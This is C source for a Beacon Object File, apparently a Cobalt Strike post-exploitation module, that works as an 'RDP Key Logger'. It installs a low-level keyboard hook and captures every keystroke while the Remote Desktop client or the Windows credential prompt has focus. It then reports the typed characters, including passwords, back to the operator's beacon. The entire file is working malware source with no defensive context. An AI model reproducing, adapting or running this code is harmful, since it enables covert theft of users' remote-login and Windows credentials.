#include <windows.h>
#include <tlhelp32.h>
#include <stdbool.h>
#include "beacon.h" // Include the BOF header

DWORD GetProcId(const wchar_t* procName) {
    DWORD procId = 0;
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 pe32;
        pe32.dwSize = sizeof(PROCESSENTRY32);
        if (Process32First(hSnap, &pe32)) {
            do {
                if (!_wcsicmp(procName, pe32.szExeFile)) {
                    procId = pe32.th32ProcessID;
                    break;
                }
            } while (Process32Next(hSnap, &pe32));
        }
    }
    CloseHandle(hSnap);
    return procId;
}

BOOL isWindowOfProcessFocused(const wchar_t* processName) {
    DWORD pid = GetProcId(processName);
    if (pid == 0) {
        return FALSE;
    }

    HWND hActiveWindow = GetForegroundWindow();
    if (hActiveWindow == NULL) {
        return FALSE;
    }

    DWORD activePid;
    GetWindowThreadProcessId(hActiveWindow, &activePid);

    if (activePid != pid) {
        return FALSE;
    }

    return TRUE;
}

LRESULT CALLBACK KbdHookProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0) {
        if (isWindowOfProcessFocused(L"mstsc.exe") || isWindowOfProcessFocused(L"CredentialUIBroker.exe")) {

            static int prev;
            BOOL isLetter = 1;

            if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
                PKBDLLHOOKSTRUCT kbdStruct = (PKBDLLHOOKSTRUCT)lParam;
                int vkCode = kbdStruct->vkCode;

                if (vkCode == 0xA2) { // LCTRL or initial signal of RALT
                    prev = vkCode;
                    return CallNextHookEx(NULL, nCode, wParam, lParam);
                }

                if (prev == 0xA2 && vkCode == 0xA5) { // RALT
                    BeaconPrintf(CALLBACK_OUTPUT, "<RALT>");
                    isLetter = 0;
                } else if (prev == 0xA2 && vkCode != 0xA5) {
                    BeaconPrintf(CALLBACK_OUTPUT, "<LCTRL>");
                }

                BOOL shiftPressed = (GetKeyState(VK_SHIFT) & 0x8000) != 0;

                switch (vkCode) {
                    case 0xA3: BeaconPrintf(CALLBACK_OUTPUT, "<RCTRL>"); isLetter = 0; break;
                    case 0xA4: BeaconPrintf(CALLBACK_OUTPUT, "<LALT>"); isLetter = 0; break;
                    case VK_CAPITAL: BeaconPrintf(CALLBACK_OUTPUT, "<CAPSLOCK>"); isLetter = 0; break;
                    case 0x08: BeaconPrintf(CALLBACK_OUTPUT, "<ESC>"); isLetter = 0; break;
                    case 0x0D: BeaconPrintf(CALLBACK_OUTPUT, "\n"); isLetter = 0; break;
                    case VK_OEM_PLUS: shiftPressed ? BeaconPrintf(CALLBACK_OUTPUT, "+") : BeaconPrintf(CALLBACK_OUTPUT, "="); isLetter = 0; break;
                    case VK_OEM_COMMA: shiftPressed ? BeaconPrintf(CALLBACK_OUTPUT, "<") : BeaconPrintf(CALLBACK_OUTPUT, ","); isLetter = 0; break;
                    case VK_OEM_MINUS: shiftPressed ? BeaconPrintf(CALLBACK_OUTPUT, "_") : BeaconPrintf(CALLBACK_OUTPUT, "-"); isLetter = 0; break;
                    case VK_OEM_PERIOD: shiftPressed ? BeaconPrintf(CALLBACK_OUTPUT, ">") : BeaconPrintf(CALLBACK_OUTPUT, "."); isLetter = 0; break;
                    case VK_OEM_1: shiftPressed ? BeaconPrintf(CALLBACK_OUTPUT, ":") : BeaconPrintf(CALLBACK_OUTPUT, ";"); isLetter = 0; break;
                    case VK_OEM_2: shiftPressed ? BeaconPrintf(CALLBACK_OUTPUT, "?") : BeaconPrintf(CALLBACK_OUTPUT, "/"); isLetter = 0; break;
                    case VK_OEM_3: shiftPressed ? BeaconPrintf(CALLBACK_OUTPUT, "~") : BeaconPrintf(CALLBACK_OUTPUT, "`"); isLetter = 0; break;
                    case VK_OEM_4: shiftPressed ? BeaconPrintf(CALLBACK_OUTPUT, "{") : BeaconPrintf(CALLBACK_OUTPUT, "["); isLetter = 0; break;
                    case VK_OEM_5: shiftPressed ? BeaconPrintf(CALLBACK_OUTPUT, "|") : BeaconPrintf(CALLBACK_OUTPUT, "\\"); isLetter = 0; break;
                    case VK_OEM_6: shiftPressed ? BeaconPrintf(CALLBACK_OUTPUT, "}") : BeaconPrintf(CALLBACK_OUTPUT, "]"); isLetter = 0; break;
                    case VK_OEM_7: shiftPressed ? BeaconPrintf(CALLBACK_OUTPUT, "\"") : BeaconPrintf(CALLBACK_OUTPUT, "'"); isLetter = 0; break;
                    default: break;
                }

                prev = vkCode;
                if (isLetter) {
                    BOOL capsLock = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
                    if (vkCode >= 0x41 && vkCode <= 0x5A) {
                        if (capsLock ^ shiftPressed) {
                            BeaconPrintf(CALLBACK_OUTPUT, "%c", vkCode);
                        } else {
                            BeaconPrintf(CALLBACK_OUTPUT, "%c", vkCode + 0x20); // Convert to lowercase
                        }
                    } else if (vkCode >= 0x61 && vkCode <= 0x7A) {
                        if (capsLock ^ shiftPressed) {
                            BeaconPrintf(CALLBACK_OUTPUT, "%c", vkCode - 0x20); // Convert to uppercase
                        } else {
                            BeaconPrintf(CALLBACK_OUTPUT, "%c", vkCode);
                        }
                    } else if (vkCode >= 0x30 && vkCode <= 0x39) {
                        if (shiftPressed) {
                            switch (vkCode) {
                                case '1': BeaconPrintf(CALLBACK_OUTPUT, "!"); break;
                                case '2': BeaconPrintf(CALLBACK_OUTPUT, "@"); break;
                                case '3': BeaconPrintf(CALLBACK_OUTPUT, "#"); break;
                                case '4': BeaconPrintf(CALLBACK_OUTPUT, "$"); break;
                                case '5': BeaconPrintf(CALLBACK_OUTPUT, "%"); break;
                                case '6': BeaconPrintf(CALLBACK_OUTPUT, "^"); break;
                                case '7': BeaconPrintf(CALLBACK_OUTPUT, "&"); break;
                                case '8': BeaconPrintf(CALLBACK_OUTPUT, "*"); break;
                                case '9': BeaconPrintf(CALLBACK_OUTPUT, "("); break;
                                case '0': BeaconPrintf(CALLBACK_OUTPUT, ")"); break;
                                default: break;
                            }
                        } else {
                            BeaconPrintf(CALLBACK_OUTPUT, "%c", vkCode);
                        }
                    }
                }
            }
        } else {
            return CallNextHookEx(NULL, nCode, wParam, lParam);
        }
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

void go(char* args, int alen) {
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Starting RDP Key Logger\n");
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Waiting for RDP related processes\n\n");
    HHOOK kbdHook = SetWindowsHookEx(WH_KEYBOARD_LL, KbdHookProc, 0, 0);

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(kbdHook);
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Done");
}
